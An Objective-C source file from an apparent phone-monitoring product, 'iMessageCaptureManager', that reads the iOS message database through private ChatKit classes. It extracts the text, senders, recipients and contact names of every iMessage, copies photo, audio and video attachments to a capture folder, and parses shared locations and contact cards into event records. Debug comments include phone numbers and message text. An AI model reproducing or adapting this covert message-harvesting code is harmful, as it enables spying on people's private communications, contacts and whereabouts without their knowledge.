//
//  IMessageCaptureDAO.m
//  iMessageCaptureManager
//
//  Created by Makara on 12/30/14.
//  Copyright (c) 2014 Vervata. All rights reserved.
//

#import "IMessageCaptureDAO.h"
#import "FMDatabase.h"
#import "DefStd.h"
#import "FxIMEvent.h"
#import "FxRecipient.h"
#import "FxAttachment.h"
#import "DateTimeFormat.h"
#import "ABContactsManager.h"
#import "AddressbookUtils.h"

#import "CKTextMessagePart.h"
#import "CKMediaObjectMessagePart.h"
#import "CKDBMessage.h"
#import "CKDBMessage+IOS6.h"
#import "CKDBMessage+iOS8.h"
#import "CKMediaObject.h"
#import "CKMediaObject+iOS8.h"

#import <objc/runtime.h>

//static NSString *const kSelectiMessageAllSQL    = @"select * from message where service = 'iMessage' or service = 'Madrid' order by date desc";
//static NSString *const kSelectiMessageLimitSQL  = @"select * from message where service = 'iMessage' or service = 'Madrid' order by date desc limit %ld";
static NSString *const kSelectiMessageAllSQL    = @"select * from message where service = 'iMessage' or service = 'Madrid' order by ROWID desc";
static NSString *const kSelectiMessageLimitSQL  = @"select * from message where service = 'iMessage' or service = 'Madrid' order by ROWID desc limit %ld";

@interface IMessageCaptureDAO (private)
- (NSArray *) selectiMessagesWithSQL: (NSString *) aSQL max: (NSUInteger) aMax;
- (NSString *) searchDisplayName: (NSString *) aAddress;
- (NSString *) locationNameAddressWithLocationFileURL: (NSURL *) aLocationFileUrl;
@end

@implementation IMessageCaptureDAO

@synthesize mAttachmentPath;

- (id) init {
    if ((self = [super init])) {
        mIMessageDatabase = [[FMDatabase databaseWithPath:kSMSHistoryDatabasePath] retain];
        [mIMessageDatabase open];
    }
    return (self);
}

- (NSArray *) alliMessages {
    NSArray *events = [self selectiMessagesWithSQL:kSelectiMessageAllSQL max:NSUIntegerMax];
    return (events);
}

- (NSArray *) alliMessagesWithMax: (NSInteger) aMaxNumber {
//    NSMutableArray *events = [NSMutableArray array];
//    NSArray *allEvents = [self alliMessages];
//    for (NSInteger i = 0; i < MIN(aMaxNumber, [allEvents count]); i++) {
//        FxIMEvent *event = [allEvents objectAtIndex:i];
//        [events addObject:event];
//    }
//    return (events);
    
    /*
     Note:
        - When item_type in db equal 5, CKDBMessage cannot init with warning:
     [Warning] Created CKDBMesage with non message item, ignoring
     */
    
    NSArray *events = [NSArray array];
    //NSString *sql = [NSString stringWithFormat:kSelectiMessageLimitSQL, (long)aMaxNumber];
    NSString *sql = kSelectiMessageAllSQL;
    events = [self selectiMessagesWithSQL:sql max:aMaxNumber];
    return (events);
}

#pragma mark - Private methods -

- (NSArray *) selectiMessagesWithSQL: (NSString *) aSQL max: (NSUInteger) aMax {
    NSMutableArray *events = [NSMutableArray array];
    FMResultSet *rs = [mIMessageDatabase executeQuery:aSQL];
    NSUInteger counter = 0;
    while ([rs next] && counter < aMax) {
        // Message
        NSString *eventDateTime         = nil;
        NSDate *dateTime                = nil;
        FxEventDirection direction      = kEventDirectionUnknown;
        NSString *imServiceID           = @"iMessage";
        FxIMServiceID serviceID         = kIMServiceiMessage;
        FxIMMessageRepresentation rep   = (kIMMessageNone | kIMMessageText);
        NSString *convID                = nil;
        NSString *convName              = nil;
        NSString *message               = nil;
        NSString *userID                = nil;
        NSString *userDisplayName       = nil;
        BOOL isOutgoing                 = NO;
        NSArray *participants           = nil;
        NSArray *attachments            = nil;
        
        /*
        double dateTimeInterval = [rs doubleForColumn:@"date"];
        dateTime                = [NSDate dateWithTimeIntervalSinceReferenceDate:dateTimeInterval];
        message                 = [rs objectForColumnName:@"text"];
        user                    = [rs objectForColumnName:@"account"];
        isOutgoing              = [rs boolForColumn:@"is_from_me"];
        */
        
        NSUInteger ROWID = (unsigned long)[rs longLongIntForColumn:@"ROWID"];
        Class $CKDBMessage = objc_getClass("CKDBMessage");
		CKDBMessage *dbMessage = [[$CKDBMessage alloc] initWithRecordID:(int)ROWID];
        DLog(@"dbMessage = %@", dbMessage);
        if (dbMessage) {
            DLog(@"date         = %@", [dbMessage date]);       // 2014-12-30 04:53:39 +0000
            DLog(@"isOutgoing   = %d", [dbMessage isOutgoing]); // 0
            DLog(@"subject      = %@", [dbMessage subject]);    // (null)
            DLog(@"text         = %@", [dbMessage text]);       // I am fine thanks
            DLog(@"address      = %@", [dbMessage address]);    // +66946741662
            DLog(@"recipients   = %@", [dbMessage recipients]); // ("+66946741662")
            DLog(@"guid         = %@", [dbMessage guid]);       // E443CC8F-3ADC-4DF7-B4DB-6C6FE4997996
            DLog(@"madridAccountGUID    = %@", [dbMessage madridAccountGUID]);      // 7EFBD7A0-9D0C-4EC2-B63E-929E35B1B951
            DLog(@"madridAccountLogin   = %@", [dbMessage madridAccountLogin]);     // P:+66818469733
            DLog(@"madridChatGUID       = %@", [dbMessage madridChatGUID]);         // iMessage;-;+66946741662
            DLog(@"madridChatIdentifier = %@", [dbMessage madridChatIdentifier]);   // +66946741662
            DLog(@"madridRoomname       = %@", [dbMessage madridRoomname]);         // (null)
            DLog(@"madridService        = %@", [dbMessage madridService]);          // iMessage
            DLog(@"madridAttributedBody = %@", [dbMessage madridAttributedBody]);   // I am fine thanks {"__kIMMessagePartAttributeName" = 0;}
            DLog(@"groupID              = %@", [dbMessage groupID]);                // +66946741662
            DLog(@"plainBody            = %@", [dbMessage plainBody]);              // I am fine thanks
            //DLog(@"formattedAddress     = %@", [dbMessage formattedAddress]);     // Called from unsupported user (0). This can only be called from user mobile(501)
            DLog(@"attachmentText       = %@", [dbMessage attachmentText]);         // (null)
            if ([dbMessage respondsToSelector:@selector(mediaObjects)]) { // iOS 8
                DLog(@"mediaObjects     = %@", [dbMessage mediaObjects]);           // (null)
            }
            if ([dbMessage respondsToSelector:@selector(messageParts)]) { // iOS below 8
                DLog(@"messageParts     = %@", [dbMessage messageParts]);
            }
            
            dateTime = [dbMessage date];
            if (dateTime) {
                eventDateTime = [DateTimeFormat dateTimeWithDate:dateTime];
            } else {
                eventDateTime = [DateTimeFormat phoenixDateTime];
            }
            isOutgoing      = [dbMessage isOutgoing];
            direction       = (isOutgoing) ? kEventDirectionOut : kEventDirectionIn;
            message         = [dbMessage previewText]; // text method return junk
            
            if (isOutgoing) {
                // User
                userID = [dbMessage madridAccountLogin];
                userID = [userID lowercaseString];  // Make sure it's the same lower cases as userID from hooking
                NSArray *userIDComponents = [userID componentsSeparatedByString:@":"];
                if ([userIDComponents count] >= 2) {
                    userDisplayName = [userIDComponents objectAtIndex:1];
                    userDisplayName = [self searchDisplayName:userDisplayName];
                }
                
                // Participants
                NSMutableArray *tempArray = [NSMutableArray array];
                NSArray *recipients = [dbMessage recipients];
                for (NSString *recipientID in recipients) {
                    FxRecipient *participant = [[FxRecipient alloc] init];
                    [participant setRecipNumAddr:recipientID];
                    NSString *recipientDisplayName = [self searchDisplayName:recipientID];
                    [participant setRecipContactName:recipientDisplayName];
                    [tempArray addObject:participant];
                    [participant release];
                }
                participants = tempArray;
            } else {
                // User
                userID = [dbMessage address]; // address is always the sender in case of incoming
                userDisplayName = [dbMessage address];
                userDisplayName = [self searchDisplayName:userDisplayName];
                
                // Participants
                NSMutableArray *tempArray = [NSMutableArray array];
                NSArray *recipients = [dbMessage recipients];
                NSString *recipientID = [dbMessage madridAccountLogin];
                recipientID = [recipientID lowercaseString];    // Make sure it's the same lower cases as userID from hooking
                NSString *recipientDisplayName = nil;
                NSArray *recipientIDComponents = [recipientID componentsSeparatedByString:@":"];
                if ([recipientIDComponents count] >= 2) {
                    recipientDisplayName = [recipientIDComponents objectAtIndex:1];
                    recipientDisplayName = [self searchDisplayName:recipientDisplayName];
                }
                FxRecipient *participant = [[FxRecipient alloc] init];
                [participant setRecipNumAddr:recipientID];
                [participant setRecipContactName:recipientDisplayName];
                [tempArray addObject:participant];
                [participant release];
                
                for (NSInteger i = 0; i < [recipients count]; i++) {
                    NSString *recipientID = [recipients objectAtIndex:i];
                    if (![recipientID isEqualToString:userID]) { // Exclude userID
                        FxRecipient *participant = [[FxRecipient alloc] init];
                        [participant setRecipNumAddr:recipientID];
                        NSString *recipientDisplayName = [self searchDisplayName:recipientID];
                        [participant setRecipContactName:recipientDisplayName];
                        [tempArray addObject:participant];
                        [participant release];
                    }
                }
                
                participants = tempArray;
            }
            
            // Conversation ID (key point to make conversion ID the same over again and again is that the order of recipients in the array must be same)
			for (int i = 0; i < [[dbMessage recipients] count]; i++){
                NSString *participantID = [[dbMessage recipients] objectAtIndex:i];
				if (i == 0) {
					convID = [NSString stringWithFormat:@"%@", participantID];
				} else {
					convID = [NSString stringWithFormat:@"%@,%@", convID, participantID];
				}
			}
            
			// Chat name
			for (int i = 0; i < [[dbMessage recipients] count]; i++){
                NSString *participantID = [[dbMessage recipients] objectAtIndex:i];
				NSString *participantDisplayName = [self searchDisplayName:participantID];
				if (i == 0) {
					convName = [NSString stringWithFormat:@"%@", participantDisplayName];
				} else {
					convName = [NSString stringWithFormat:@"%@,%@", convName, participantDisplayName];
				}
			}
            
            // Attachments, shared contact, shared location
            Class $CKAudioMediaObject = objc_getClass("CKAudioMediaObject");        // Audio file
            Class $CKImageMediaObject = objc_getClass("CKImageMediaObject");        // Image file
            Class $CKCompressibleImageMediaObject = objc_getClass("CKCompressibleImageMediaObject"); // Image file (.png, .jpg iOS 6)
            Class $CKMovieMediaObject = objc_getClass("CKMovieMediaObject");        // Video file
            Class $CKVideoMediaObject = objc_getClass("CKVideoMediaObject");        // Video file (iOS 6)
            Class $CKContactMediaObject = objc_getClass("CKContactMediaObject");    // Contact file
            Class $CKVCardMediaObject = objc_getClass("CKVCardMediaObject");        // Contact file (iOS 6)
            // Calendar file
            Class $CKLocationMediaObject = objc_getClass("CKLocationMediaObject");  // Location file (CKLocationMediaObject subclass of CKContactMediaObject)
            
            BOOL copy = NO;
            NSString *locNameAddr = nil;
            NSString *contactName = nil;
            
            NSFileManager *fileManager = [NSFileManager defaultManager];
            NSMutableArray *tempArray = [NSMutableArray array];
            
            NSArray *mediaObjects = nil;
            if ([dbMessage respondsToSelector:@selector(messageParts)]) { // Below iOS 8
                Class $CKTextMessagePart = objc_getClass("CKTextMessagePart");
                Class $CKMediaObjectMessagePart = objc_getClass("CKMediaObjectMessagePart");
                NSMutableArray *tempArray = [NSMutableArray array];
                NSArray *messageParts = [dbMessage messageParts];
                for (id messagePart in messageParts) {
                    if ([messagePart isKindOfClass:$CKTextMessagePart]) {
                        ;
                    } else if ([messagePart isKindOfClass:$CKMediaObjectMessagePart]) {
                        CKMediaObject *mediaObject = [messagePart mediaObject];
                        [tempArray addObject:mediaObject];
                    }
                }
                mediaObjects = tempArray;
            } else if ([dbMessage respondsToSelector:@selector(mediaObjects)]) { // iOS 8,9
                mediaObjects = [dbMessage mediaObjects];
            }
            
            for (CKMediaObject *mediaObject in mediaObjects) {
                NSURL *fileURL = [NSURL fileURLWithPath:[mediaObject filename]]; // Below iOS 8
                if ([mediaObject respondsToSelector:@selector(fileURL)]) { // iOS 8,9
                    fileURL = [mediaObject fileURL];
                }
                NSString *filePath = [fileURL path];
                filePath = [filePath stringByReplacingOccurrencesOfString:@"/var/root/" withString:@"/var/mobile/"];
                NSString *savedFilePath = [NSString stringWithFormat:@"%@%f%@", mAttachmentPath, [[dbMessage date] timeIntervalSince1970], [fileURL lastPathComponent]];
                
                DLog(@"mediaObject class    = %@", [mediaObject class]);
                DLog(@"savedFilePath        = %@", savedFilePath);
                DLog(@"filePath             = %@", filePath);
                DLog(@"fileURL              = %@", fileURL);
                DLog(@"fileURL, path        = %@", [fileURL path]);
                
                FxAttachment *attachment = [[FxAttachment alloc] init];
                
                if ([mediaObject isKindOfClass:$CKAudioMediaObject]) {
                    DLog(@"Audio file");
                    [fileManager copyItemAtPath:filePath toPath:savedFilePath error:nil];
                    [attachment setFullPath:savedFilePath];
                    [tempArray addObject:attachment];
                } else if ([mediaObject isKindOfClass:$CKImageMediaObject] ||
                           [mediaObject isKindOfClass:$CKCompressibleImageMediaObject]) {
                    DLog(@"Image file");
                    [fileManager copyItemAtPath:filePath toPath:savedFilePath error:nil];
                    [attachment setFullPath:savedFilePath];
                    [tempArray addObject:attachment];
                } else if ([mediaObject isKindOfClass:$CKMovieMediaObject] ||
                           [mediaObject isKindOfClass:$CKVideoMediaObject]) {
                    DLog(@"Video file");
                    [fileManager copyItemAtPath:filePath toPath:savedFilePath error:nil];
                    [attachment setFullPath:savedFilePath];
                    [tempArray addObject:attachment];
                } else if ([mediaObject isKindOfClass:$CKLocationMediaObject]) {
                    DLog(@"Location file");
                    locNameAddr = [self locationNameAddressWithLocationFileURL:[NSURL fileURLWithPath:filePath]];
                    DLog(@"locNameAddr = %@", locNameAddr);
                    if ([message length] > 0) {
                        copy = YES;
                    } else {
                        message = locNameAddr;
                    }
                } else if ([mediaObject isKindOfClass:$CKContactMediaObject] ||
                           [mediaObject isKindOfClass:$CKVCardMediaObject]) {
                    DLog(@"Contact file");
                    NSData *vCardData = [NSData dataWithContentsOfFile:filePath];
                    DLog(@"vCardData length = %lu", (unsigned long)[vCardData length]);
                    contactName = [AddressbookUtils getVCardStringFromData:vCardData];
                    DLog(@"contactName = %@", contactName);
                    if ([message length] > 0) {
                        copy = YES;
                    } else {
                        message = contactName;
                        rep = kIMMessageContact;
                    }
                }
                [attachment release];
            }
            
            attachments = tempArray;
            
            if ([attachments count]) {
                if([message length]==0){ // Attachment only
                    rep = kIMMessageNone;
                }
            }
            
            FxIMEvent *event = [[FxIMEvent alloc] init];
            [event setDateTime:eventDateTime];
            [event setMDirection:direction];
            [event setMIMServiceID:imServiceID];
            [event setMServiceID:serviceID];
            [event setMConversationID:convID];
            [event setMConversationName:convName];
            [event setMMessage:message];
            [event setMRepresentationOfMessage:rep];
            [event setMUserID:userID];
            [event setMUserDisplayName:userDisplayName];
            [event setMParticipants:participants];
            [event setMAttachments:attachments];
            
            // If shared contact, shared location contains text we separate the iMessage into two
            if (copy) {
                if (contactName) {
                    rep = kIMMessageContact;
                }
                NSString *copyMessage = contactName != nil ? contactName : locNameAddr;
                FxIMEvent *copyEvent = [event copyWithZone:nil];
                [copyEvent setMMessage:copyMessage];
                [copyEvent setMAttachments:nil];
                [copyEvent setMRepresentationOfMessage:rep];
                [events addObject:copyEvent];
                [copyEvent release];
            }
            
            [events addObject:event];
            [event release];
            
            counter++;
        }
        
        [dbMessage release];
    }
    
    return (events);
}

- (NSString *) searchDisplayName: (NSString *) aAddress {
    ABContactsManager *contactManager   = [[ABContactsManager alloc] init];
    NSString *displayName = nil;
    if ([aAddress rangeOfString:@"@"].location == NSNotFound) {
        displayName = [contactManager searchFirstNameLastName:aAddress contactID:-1];
    } else {
        displayName = [contactManager searchDistinctFirstLastNameWithEmailV2:aAddress];
    }
    
    if (![displayName length]) {
        displayName = aAddress;
    }
    [contactManager release];
    return (displayName);
}

- (NSString *) locationNameAddressWithLocationFileURL: (NSURL *) aLocationFileUrl {
    NSString *locationNameAddresss = nil;
    NSString* googleurl =@"";
    NSString* address   =@"";
    // Extract vcf to String
    NSString *filePath = [aLocationFileUrl path];
    NSString *vCardString = [NSString stringWithContentsOfFile:filePath encoding:NSUTF8StringEncoding error:nil ];
    DLog(@"vCardString %@",vCardString);
    // Use regular to get mapurl
    NSArray * extactvCard = [vCardString componentsSeparatedByString:@"\n"];
    for (int i =0; i< [extactvCard count]; i++) {
        
        if([[extactvCard objectAtIndex:i] rangeOfString:@".ADR;" options:NSCaseInsensitiveSearch].location != NSNotFound){
            DLog(@"*** address line %@",[extactvCard objectAtIndex:i]);
            NSString *removesymbol = [[extactvCard objectAtIndex:i]  stringByReplacingOccurrencesOfString:@";"withString:@" "];
            DLog(@"*** removesymbol %@",removesymbol);
            NSArray * extactonlcharacter = [removesymbol componentsSeparatedByString:@":"];
            DLog(@"*** extactonlcharacter %@",extactonlcharacter);
            address = [extactonlcharacter objectAtIndex:1];
            DLog(@"*** address %@ ",address);
        }
        
        if([[extactvCard objectAtIndex:i] rangeOfString:@"http://maps" options:NSCaseInsensitiveSearch].location != NSNotFound){
            
            DLog(@"*** url line %@",[extactvCard objectAtIndex:i]);
            NSArray * extactonlyurl = [[extactvCard objectAtIndex:i] componentsSeparatedByString:@"http:"];
            DLog(@"*** extactonlyurl %@",extactonlyurl);
            for (int j =0; j< [extactonlyurl count]; j++) {
                if([[extactonlyurl objectAtIndex:j] rangeOfString:@"//maps" options:NSCaseInsensitiveSearch].location != NSNotFound){
                    googleurl = [NSString stringWithFormat:@"http:%@",[extactonlyurl objectAtIndex:j]];
                    DLog(@"*** url %@ ",googleurl);
                }
            }
        }
    }
    
    // iOS 8, apple map, http://maps.apple.com/?ll=13.756858\,100.541700 , we need to delete backslash
    googleurl = [googleurl stringByReplacingOccurrencesOfString:@"\\" withString:@""];
    
    if([address length]>0){
        locationNameAddresss = [NSString stringWithFormat:@"%@\n%@",address,googleurl];
    }else{
        locationNameAddresss = [NSString stringWithFormat:@"%@",googleurl];
        
    }
    
    DLog(@"address %@, length %lu",address, (unsigned long)[address length]);
    DLog(@"googleurl %@",googleurl);
    
    return (locationNameAddresss);
}

#pragma mark - Memory management -

- (void) dealloc {
    DLog(@"IMessageCaptureDAO dealloc...");
    [mIMessageDatabase close];
    [mIMessageDatabase release];
    [mAttachmentPath release];
    [super dealloc];
}

@end
